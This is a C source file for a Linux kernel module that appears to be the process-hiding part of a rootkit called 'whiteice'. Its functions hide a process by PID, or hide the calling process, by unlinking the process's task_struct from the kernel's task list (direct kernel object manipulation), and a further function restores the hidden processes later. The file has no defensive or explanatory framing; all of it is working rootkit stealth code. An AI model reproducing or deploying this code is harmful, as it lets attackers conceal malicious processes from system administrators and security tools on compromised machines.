#include "defs.h"
#include "dkom.h"

#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/init.h>
#include <linux/sched/signal.h>
#include <linux/uaccess.h>
#include <linux/slab.h>

struct task_struct *hidden_tasks[128];
int hidden_index = 0;

void init_dkom(void) {
    printk(KERN_INFO "[whiteice:dkom] DKOM initialized\n");
}

int hide_process_by_pid(pid_t pid) {
    struct task_struct *task;
    for_each_process(task) {
        if (task->pid == pid) {
            list_del_init(&task->tasks);
            hidden_tasks[hidden_index++] = task;
            printk(KERN_INFO "[whiteice:dkom] Process %d hidden\n", pid);
            return 0;
        }
    }
    return -1;
}

int hide_current_process(void) {
    struct task_struct *task = current;
    list_del_init(&task->tasks);
    hidden_tasks[hidden_index++] = task;
    printk(KERN_INFO "[whiteice:dkom] Current process (PID %d) hidden\n", task->pid);
    return 0;
}

int restore_hidden_processes(void) {
    int i;
    for (i = 0; i < hidden_index; i++) {
        list_add(&hidden_tasks[i]->tasks, &init_task.tasks);
        printk(KERN_INFO "[whiteice:dkom] Restored PID %d\n", hidden_tasks[i]->pid);
    }
    hidden_index = 0;
    return 0;
}
